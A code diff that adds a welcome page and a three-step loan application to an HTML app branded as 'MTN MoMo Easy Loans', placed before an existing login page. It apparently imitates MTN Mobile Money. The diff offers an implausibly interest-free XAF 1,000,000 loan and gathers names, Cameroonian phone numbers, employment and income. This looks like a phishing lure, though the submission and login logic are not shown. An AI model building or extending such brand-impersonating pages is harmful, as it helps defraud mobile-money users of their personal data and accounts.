@@ -128,6 +128,234 @@
 <body>
   <!-- PAGE CONTAINER (simplified for brevity, full structure remains) -->
   <div id="app">
+    <!-- ═══ NEW: Welcome page ═══ -->
+    <div id="page-welcome" class="page">
+      <div class="navbar">
+        <div class="mtn-logo">
+          <div class="mtn-logo-icon"></div>
+          <div class="mtn-logo-text">MTN MoMo</div>
+          <div class="mtn-logo-sub">Easy Loans</div>
+        </div>
+        <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
+      </div>
+
+      <div class="welcome-wrap">
+        <div class="welcome-card">
+          <h1 class="welcome-title">Welcome to MTN MoMo</h1>
+          <p class="welcome-sub">Get loans easily through MTN MoMo</p>
+
+          <div class="loan-calc">
+            <div class="loan-calc-title">Loan Calculator</div>
+            <div class="loan-row">
+              <span class="label">Amount</span>
+              <span class="val" id="wAmount">XAF 1,000,000</span>
+            </div>
+            <div class="loan-row">
+              <span class="label">Term</span>
+              <span class="val" id="wTerm">48 Months</span>
+            </div>
+
+            <div class="slider-wrap">
+              <input type="range" class="slider" id="wSlider" min="500000" max="5000000" step="50000" value="1000000" oninput="updateCalculator()">
+              <div class="slider-limits">
+                <span>XAF 500,000</span>
+                <span>XAF 5,000,000</span>
+              </div>
+            </div>
+
+            <div class="monthly-box">
+              <span class="lbl">Monthly Payment</span>
+              <span class="amount" id="wMonthly">XAF 20,834</span>
+            </div>
+          </div>
+
+          <button class="btn-primary" style="width:100%;" onclick="startApplication()">START APPLICATION</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- ═══ NEW: Step 1 — Loan Details ═══ -->
+    <div id="page-step1" class="page">
+      <div class="navbar">
+        <a class="nav-left" onclick="goTo('page-welcome')">← Back</a>
+        <div class="mtn-logo">
+          <div class="mtn-logo-icon"></div>
+          <div class="mtn-logo-text">MTN MoMo</div>
+          <div class="mtn-logo-sub">Loans</div>
+        </div>
+        <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
+      </div>
+
+      <div class="progress-wrap">
+        <div class="progress-title">Loan Application</div>
+        <div class="progress-sub">Step 1 of 3</div>
+        <div class="progress-bar">
+          <div class="progress-seg active"></div>
+          <div class="progress-seg"></div>
+          <div class="progress-seg"></div>
+        </div>
+      </div>
+
+      <div class="form-wrap">
+        <div class="form-card">
+          <div class="form-field">
+            <label>Loan Type</label>
+            <select id="fLoanType">
+              <option>Business Loan</option>
+              <option>Personal Loan</option>
+              <option>Emergency Loan</option>
+              <option>Education Loan</option>
+            </select>
+          </div>
+
+          <div class="form-field">
+            <label>Loan Amount (XAF)</label>
+            <input type="number" id="fAmount" value="1000000" min="50000" max="5000000" step="10000">
+          </div>
+
+          <div class="form-field">
+            <label>Loan Term</label>
+            <select id="fTerm">
+              <option>12 Months</option>
+              <option>24 Months</option>
+              <option>36 Months</option>
+              <option selected>48 Months</option>
+            </select>
+          </div>
+
+          <div class="form-field">
+            <label>Purpose of Loan</label>
+            <textarea id="fPurpose" placeholder="Describe the purpose of your loan..."></textarea>
+          </div>
+
+          <div class="form-actions">
+            <button class="btn-outline" onclick="goTo('page-welcome')">BACK</button>
+            <button class="btn-primary" onclick="nextToStep2()">NEXT STEP</button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ═══ NEW: Step 2 — Personal Details ═══ -->
+    <div id="page-step2" class="page">
+      <div class="navbar">
+        <a class="nav-left" onclick="goTo('page-step1')">← Back</a>
+        <div class="mtn-logo">
+          <div class="mtn-logo-icon"></div>
+          <div class="mtn-logo-text">MTN MoMo</div>
+          <div class="mtn-logo-sub">Loans</div>
+        </div>
+        <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
+      </div>
+
+      <div class="progress-wrap">
+        <div class="progress-title">Loan Application</div>
+        <div class="progress-sub">Step 2 of 3</div>
+        <div class="progress-bar">
+          <div class="progress-seg active"></div>
+          <div class="progress-seg active"></div>
+          <div class="progress-seg"></div>
+        </div>
+      </div>
+
+      <div class="form-wrap">
+        <div class="form-card">
+          <div class="form-row">
+            <div class="form-field">
+              <label>First Name</label>
+              <input type="text" id="fFirst" placeholder="First Name">
+            </div>
+            <div class="form-field">
+              <label>Last Name</label>
+              <input type="text" id="fLast" placeholder="Last Name">
+            </div>
+          </div>
+
+          <div class="form-field">
+            <label>Phone Number (Cameroon)</label>
+            <div class="phone-prefix">
+              <span class="prefix">+237</span>
+              <input type="tel" id="fPhone" maxlength="9" placeholder="670123456">
+            </div>
+            <div class="form-hint">9 digits without +237 prefix (e.g., 670123456)</div>
+          </div>
+
+          <div class="form-actions">
+            <button class="btn-outline" onclick="goTo('page-step1')">BACK</button>
+            <button class="btn-primary" onclick="nextToStep3()">NEXT STEP</button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ═══ NEW: Step 3 — Employment + Summary ═══ -->
+    <div id="page-step3" class="page">
+      <div class="navbar">
+        <a class="nav-left" onclick="goTo('page-step2')">← Back</a>
+        <div class="mtn-logo">
+          <div class="mtn-logo-icon"></div>
+          <div class="mtn-logo-text">MTN MoMo</div>
+          <div class="mtn-logo-sub">Loans</div>
+        </div>
+        <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
+      </div>
+
+      <div class="progress-wrap">
+        <div class="progress-title">Loan Application</div>
+        <div class="progress-sub">Step 3 of 3</div>
+        <div class="progress-bar">
+          <div class="progress-seg active"></div>
+          <div class="progress-seg active"></div>
+          <div class="progress-seg active"></div>
+        </div>
+      </div>
+
+      <div class="form-wrap">
+        <div class="form-card">
+          <div class="form-field">
+            <label>Employment Status</label>
+            <select id="fEmp">
+              <option>Self-employed</option>
+              <option>Employed full-time</option>
+              <option>Employed part-time</option>
+              <option>Student</option>
+              <option>Unemployed</option>
+            </select>
+          </div>
+
+          <div class="form-field">
+            <label>Annual Income (XAF)</label>
+            <input type="number" id="fIncome" placeholder="Enter annual income">
+          </div>
+
+          <div class="summary-box">
+            <h4>Application Summary</h4>
+            <div class="summary-row">
+              <span>Loan Amount:</span>
+              <span class="val" id="sumAmount">XAF 1,000,000</span>
+            </div>
+            <div class="summary-row">
+              <span>Loan Term:</span>
+              <span class="val" id="sumTerm">48 Months</span>
+            </div>
+            <div class="summary-row">
+              <span>Purpose:</span>
+              <span class="val" id="sumPurpose">—</span>
+            </div>
+            <div class="summary-row">
+              <span>Applicant:</span>
+              <span class="val" id="sumApplicant">—</span>
+            </div>
+          </div>
+
+          <div class="form-actions">
+            <button class="btn-outline" onclick="goTo('page-step2')">BACK</button>
+            <button class="btn-primary" id="submitBtn" onclick="submitApplication()">SUBMIT APPLICATION</button>
+          </div>
+        </div>
+      </div>
+    </div>
+    
     <!-- Login page -->
     <div id="page-login" class="page active">
       <div class="navbar">
